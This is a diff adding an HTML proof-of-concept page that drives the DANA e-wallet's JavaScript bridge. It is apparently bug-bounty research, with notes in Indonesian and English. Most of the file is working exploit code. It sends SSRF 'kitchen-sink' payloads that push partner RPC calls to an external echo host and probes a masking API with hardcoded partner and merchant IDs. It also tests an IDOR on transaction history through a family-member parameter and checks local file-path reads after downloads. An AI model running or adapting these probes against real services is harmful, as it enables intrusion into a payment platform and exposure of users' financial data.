@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DANA H5 Bridge Test v10</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:12px;margin:0;padding-top:24px}
+  h3{color:#ff0;margin:14px 0 4px;font-size:13px}
+  .ok{color:#0f0}.err{color:#f55}.pending{color:#888}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:220px;overflow:auto}
+  button{background:#050;color:#0f0;border:1px solid #0f0;padding:14px;margin:8px 0;font-size:15px;width:100%;font-weight:bold}
+  button.mini{width:auto;padding:6px 10px;font-size:11px;background:#220;color:#ff0;border:1px solid #660;font-weight:normal}
+  button:disabled{background:#222;color:#666;border-color:#444}
+  #status{position:fixed;top:0;left:0;right:0;background:#330;color:#ff0;padding:5px;font-size:11px;z-index:9}
+  .note{color:#0ff;margin:4px 0}
+  .warn{color:#f80;margin:4px 0}
+  input{width:96%;background:#000;color:#0ff;border:1px solid #660;padding:8px;font-size:12px;margin:2px 0 8px 0;font-family:monospace}
+</style>
+</head>
+<body>
+<div id="status">v10 boot...</div>
+<h3 style="color:#0ff">v10 - MINITUNNEL PEEL: httpMethod oracle + kitchen-sink + masking partnerId hunt + family self-IDOR + apFilePath verify</h3>
+<p class="note">PHASE 1 (env only) runs now. PHASE 2 = isi 2 input di bawah (opsional), DISCONNECT HTTP Toolkit, tap RUN. Same flow as v8/v9.</p>
+<p class="warn">Blocks [2]-[8] = minitunnel RPC. [16] permission dialog (TAP DENY kalau muncul). Kalau semua error-nya aneh/busy di semua blok = proxy masih nyala, disconnect &amp; RE-RUN.</p>
+
+<h3>[0] env</h3><pre id="p-0" class="pending">pending</pre>
+
+<p class="note">INPUT 1 - partnerId dari intercept HTTP Toolkit kamu (checkout / mini-program / RPC body), pisah koma. Max 3. Kosongin kalau gak ada:</p>
+<input id="inp-pids" placeholder="contoh: 2019092596400267353417, 216610000123456789012">
+<p class="note">INPUT 2 - userId akun DANA LAIN MILIKMU SENDIRI (utk family-IDOR self-test). JANGAN pakai userId orang lain. Kosongin kalau gak punya akun-2:</p>
+<input id="inp-uid2" placeholder="216610000xxxxxxxxxx (userId akun kedua kamu)">
+
+<button id="btn2" onclick="runPhase2()">&#9654; RUN PHASE 2 (peel battery - HTTP Toolkit must be OFF)</button>
+
+<h3>[1] netcheck</h3><pre id="p-1" class="pending">pending</pre>
+<h3>[2] invoke {partnerId, httpMethod:POST} - oracle field #3</h3><pre id="p-2" class="pending">pending</pre>
+<h3>[3] invoke KITCHEN-SINK GET -&gt; httpbin.org/anything (echo)</h3><pre id="p-3" class="pending">pending</pre>
+<h3>[4] invoke KITCHEN-SINK POST -&gt; httpbin.org/anything (echo)</h3><pre id="p-4" class="pending">pending</pre>
+<h3>[5] masking {partnerId: merchantId}</h3><pre id="p-5" class="pending">pending</pre>
+<h3>[6] masking {partnerId: EMVCO_CLIENT}</h3><pre id="p-6" class="pending">pending</pre>
+<h3>[7] masking x input pids (paramcenter config hunt)</h3><pre id="p-7" class="pending">pending</pre>
+<h3>[8] invoke x input pids (kitchen-sink GET)</h3><pre id="p-8" class="pending">pending</pre>
+<h3>[9] trx CONTROL (tanpa family param, forceCache:false)</h3><pre id="p-9" class="pending">pending</pre>
+<h3>[10] trx familyAccountMemberIds:[akun-2 kamu]</h3><pre id="p-10" class="pending">pending</pre>
+<h3>[11] createShortLink {url: m.dana.id}</h3><pre id="p-11" class="pending">pending</pre>
+<h3>[12] createShortLink {url: pages/v10b.txt}</h3><pre id="p-12" class="pending">pending</pre>
+<h3>[13] downloadFile ping.txt + fetch(apFilePath)</h3><pre id="p-13" class="pending">pending</pre>
+<h3>[14] downloadFile v10b.txt + fetch(apFilePath)</h3><pre id="p-14" class="pending">pending</pre>
+<h3>[15] download generalDownload poc_v10_dl (CEK FOLDER DOWNLOADS)</h3><pre id="p-15" class="pending">pending</pre>
+<h3>[16] requestPermissions CAMERA 45s (DIALOG? TAP DENY)</h3><pre id="p-16" class="pending">pending</pre>
+
+<button onclick="copyAll()">COPY ALL RESULTS (compact)</button>
+<button class="mini" onclick="runMini()" style="width:100%;padding:10px">[17] OPTIONAL LAST: callSubApp mini:// (may navigate away - do COPY ALL first)</button>
+
+<script>
+(function(){
+  var RESULTS = {};
+  var LOG = [];
+  var running = false;
+  var attempt = 0;
+  var XENDIT_CID = '2019092596400267353417';
+  var MERCHANT_ID = '216620000035833566172';
+  var OP_PARTNER = 'id.dana.minitunnel.partner.invoke';
+  var OP_MASKING = 'id.dana.minitunnel.user.info.masking';
+  var PAGES = 'https://rfypych.github.io/poc';
+  var ECHO = 'https://httpbin.org/anything?src=danav10';
+
+  function compact(o){
+    try { return typeof o === 'string' ? o : JSON.stringify(o); } catch(e) { return String(o); }
+  }
+  function set(id, obj, cls){
+    var el = document.getElementById(id);
+    el.className = cls || 'ok';
+    try { el.textContent = (typeof obj === 'string') ? obj : JSON.stringify(obj, null, 1); } catch(e) { el.textContent = String(obj); }
+    RESULTS[id] = obj;
+  }
+  var statusEl = document.getElementById('status');
+  function status(t){ statusEl.textContent = t; }
+
+  function bridgeReady(cb){
+    if (window.AlipayJSBridge) return cb();
+    var fired = false;
+    var go = function(){ if (!fired){ fired = true; cb(); } };
+    document.addEventListener('AlipayJSBridgeReady', go, false);
+    setTimeout(go, 5000);
+  }
+  function call(api, param, timeoutMs){
+    return new Promise(function(resolve){
+      var done = false;
+      var t = setTimeout(function(){ if(!done){ done = true; resolve({__timeout:true, waitedMs:timeoutMs||15000}); } }, timeoutMs || 15000);
+      try {
+        window.AlipayJSBridge.call(api, param || {}, function(r){
+          if (!done) { done = true; clearTimeout(t); resolve(r); }
+        });
+      } catch(e) {
+        if (!done) { done = true; clearTimeout(t); resolve({__exception:String(e)}); }
+      }
+    });
+  }
+  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+  function getPids(){
+    var raw = (document.getElementById('inp-pids').value || '').trim();
+    if (!raw) return [];
+    return raw.split(/[\s,;]+/).filter(Boolean).slice(0,3);
+  }
+  function getUid2(){
+    return (document.getElementById('inp-uid2').value || '').trim();
+  }
+  function kitchen(pid, method){
+    var bodyStr = JSON.stringify({poc:'v10', partnerId:pid, via:'dana-h5-minitunnel'});
+    return {
+      partnerId: pid,
+      httpMethod: method,
+      url: ECHO, requestUrl: ECHO, apiUrl: ECHO, gatewayUrl: ECHO, serviceUrl: ECHO,
+      endpoint: ECHO, uri: ECHO, requestUri: ECHO, href: ECHO,
+      path: '/anything', requestPath: '/anything', apiName: '/anything',
+      interfaceName: '/anything', methodName: 'anything', operation: 'anything',
+      body: bodyStr, requestBody: bodyStr, content: bodyStr, data: bodyStr, params: bodyStr,
+      headers: {'X-PoC':'dana-v10'}, requestHeaders: {'X-PoC':'dana-v10'},
+      contentType: 'application/json', charset: 'utf-8',
+      requestId: 'v10-' + Date.now(), requestNo: 'v10', version: '1.0',
+      appId: 'null_online', source: 'h5', scene: 'poc'
+    };
+  }
+  function tryFetchAp(res){
+    var ap = res && (res.apFilePath || res.filePath || res.fileURL);
+    if (!ap || typeof ap !== 'string') return Promise.resolve({noApPath:true, res:res});
+    return fetch(ap, {cache:'no-store'})
+      .then(function(r){ return r.text().then(function(tx){ return {fetched:true, http:r.status, body:tx.slice(0,120), apFilePath:ap}; }); })
+      .catch(function(e){ return {fetched:false, err:String(e).slice(0,80), apFilePath:ap}; });
+  }
+
+  window.copyBlock = function(id){
+    var ta = document.createElement('textarea');
+    ta.value = id + ': ' + compact(RESULTS[id]);
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied ' + id); } catch(e) { status('copy failed'); }
+    document.body.removeChild(ta);
+  };
+  window.copyAll = function(){
+    var lines = [];
+    lines.push('v10 @ ' + location.href);
+    lines.push('log: ' + compact(LOG));
+    lines.push('inputs: ' + compact({pids:getPids(), uid2:getUid2()}));
+    for (var k = 0; k <= 16; k++) {
+      var id = 'p-' + k;
+      if (RESULTS[id] !== undefined) lines.push(id + ': ' + compact(RESULTS[id]));
+    }
+    var ta = document.createElement('textarea');
+    ta.value = lines.join('\n');
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied - paste it back'); } catch(e) { status('copy failed - screenshot'); }
+    document.body.removeChild(ta);
+  };
+
+  function netcheck(){
+    var t0 = Date.now();
+    var rel = fetch('ping.txt?cb=' + Date.now(), {cache:'no-store'})
+      .then(function(r){ return {ok:true, http:r.status, ms:Date.now()-t0}; })
+      .catch(function(e){ return {ok:false, err:String(e).slice(0,60), ms:Date.now()-t0}; });
+    var abs = fetch(PAGES + '/ping.txt?cb=' + Date.now(), {mode:'no-cors', cache:'no-store'})
+      .then(function(){ return {noCors:true, ok:true}; })
+      .catch(function(e){ return {noCors:true, ok:false, err:String(e).slice(0,60)}; });
+    return Promise.all([rel, abs]).then(function(a){ return {relative:a[0], absoluteNoCors:a[1]}; });
+  }
+
+  window.runMini = async function(){
+    var r = await call('callSubApp', {url:'mini://?title=v10probe'}, 8000);
+    alert('[17] callSubApp mini:// -> ' + compact(r));
+  };
+
+  window.runPhase2 = async function(){
+    if (running) return;
+    if (!window.AlipayJSBridge) { status('no bridge - cannot run phase 2'); return; }
+    running = true; attempt++;
+    var btn = document.getElementById('btn2');
+    btn.disabled = true;
+    var pids = getPids();
+    var uid2 = getUid2();
+    LOG.push({attempt:attempt, startedAt:new Date().toISOString(), pids:pids, uid2:uid2?'set':'empty'});
+    try {
+      status('P2/' + attempt + ' [1] netcheck');
+      set('p-1', await netcheck());
+
+      status('P2/' + attempt + ' [2] invoke partnerId+httpMethod oracle');
+      set('p-2', await call('requestApi', {operationType:OP_PARTNER, payload:{partnerId:XENDIT_CID, httpMethod:'POST'}}, 20000));
+      await sleep(800);
+
+      status('P2/' + attempt + ' [3] invoke kitchen-sink GET (httpbin echo)');
+      set('p-3', await call('requestApi', {operationType:OP_PARTNER, payload:kitchen(XENDIT_CID, 'GET')}, 25000));
+      await sleep(800);
+
+      status('P2/' + attempt + ' [4] invoke kitchen-sink POST (httpbin echo)');
+      set('p-4', await call('requestApi', {operationType:OP_PARTNER, payload:kitchen(XENDIT_CID, 'POST')}, 25000));
+      await sleep(800);
+
+      status('P2/' + attempt + ' [5] masking partnerId=merchantId');
+      set('p-5', await call('requestApi', {operationType:OP_MASKING, payload:{partnerId:MERCHANT_ID}}, 20000));
+      await sleep(800);
+
+      status('P2/' + attempt + ' [6] masking partnerId=EMVCO_CLIENT');
+      set('p-6', await call('requestApi', {operationType:OP_MASKING, payload:{partnerId:'EMVCO_CLIENT'}}, 20000));
+      await sleep(800);
+
+      status('P2/' + attempt + ' [7] masking x input pids');
+      if (pids.length){
+        var mres = {};
+        for (var i = 0; i < pids.length; i++){
+          mres[pids[i]] = await call('requestApi', {operationType:OP_MASKING, payload:{partnerId:pids[i]}}, 20000);
+          await sleep(600);
+        }
+        set('p-7', mres);
+      } else {
+        set('p-7', 'skipped - no partnerId input', 'err');
+      }
+
+      status('P2/' + attempt + ' [8] invoke x input pids (kitchen GET)');
+      if (pids.length){
+        var ires = {};
+        for (var j = 0; j < pids.length; j++){
+          ires[pids[j]] = await call('requestApi', {operationType:OP_PARTNER, payload:kitchen(pids[j], 'GET')}, 25000);
+          await sleep(600);
+        }
+        set('p-8', ires);
+      } else {
+        set('p-8', 'skipped - no partnerId input', 'err');
+      }
+
+      status('P2/' + attempt + ' [9] trx control (no family param)');
+      set('p-9', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:false}, 25000));
+
+      status('P2/' + attempt + ' [10] trx familyAccountMemberIds=[uid2]');
+      if (uid2){
+        set('p-10', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:false, familyAccountMemberIds:[uid2]}, 25000));
+      } else {
+        set('p-10', 'skipped - no second-account userId input', 'err');
+      }
+
+      status('P2/' + attempt + ' [11] createShortLink m.dana.id');
+      set('p-11', await call('createShortLink', {url:'https://m.dana.id'}, 20000));
+      await sleep(800);
+
+      status('P2/' + attempt + ' [12] createShortLink pages v10b.txt');
+      set('p-12', await call('createShortLink', {url:PAGES + '/v10b.txt'}, 20000));
+
+      status('P2/' + attempt + ' [13] downloadFile ping.txt + fetch ap');
+      var dl1 = await call('downloadFile', {url:PAGES + '/ping.txt', filePath:'v10a.txt', downloadTaskId:6}, 20000);
+      var f1 = await tryFetchAp(dl1);
+      set('p-13', {call:dl1, fetchAp:f1});
+
+      status('P2/' + attempt + ' [14] downloadFile v10b.txt + fetch ap');
+      var dl2 = await call('downloadFile', {url:PAGES + '/v10b.txt', filePath:'v10b.txt', downloadTaskId:7}, 20000);
+      var f2 = await tryFetchAp(dl2);
+      set('p-14', {call:dl2, fetchAp:f2});
+
+      status('P2/' + attempt + ' [15] download generalDownload poc_v10_dl');
+      set('p-15', await call('download', {event:'generalDownload', info:{url:PAGES + '/ping.txt', fileName:'poc_v10_dl', fileFormat:'.txt'}}, 20000));
+
+      status('P2/' + attempt + ' [16] requestPermissions CAMERA - TAP DENY IF DIALOG');
+      set('p-16', await call('requestPermissions', {event:'request', info:{permissions:['android.permission.CAMERA']}}, 45000));
+
+      LOG.push({attempt:attempt, finishedAt:new Date().toISOString(), note:'phase2 complete'});
+      status('DONE P2 attempt ' + attempt + ' - COPY ALL, then optionally [17]');
+    } catch(e) {
+      status('phase2 error: ' + String(e).slice(0,60));
+    }
+    running = false;
+    btn.disabled = false;
+    btn.innerHTML = '&#8635; RE-RUN PHASE 2 (if TLS/busy errors everywhere, HTTP Toolkit was still on - disconnect + tap again)';
+  };
+
+  bridgeReady(function(){
+    if (!window.AlipayJSBridge){
+      set('p-0', {noBridge:true, href:location.href, ua:navigator.userAgent.slice(0,80)}, 'err');
+      status('NO BRIDGE (browser?) - open inside DANA container');
+      return;
+    }
+    var sp = {};
+    try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
+    set('p-0', {hasBridge:true, appId:sp.appId, startScene:sp.startScene||sp.scene, href:location.href.slice(0,70)});
+    LOG.push({phase1Done:new Date().toISOString()});
+    status('PHASE 1 DONE - isi input (opsional), DISCONNECT HTTP Toolkit, then RUN PHASE 2');
+  });
+})();
+</script>
+</body>
+</html>
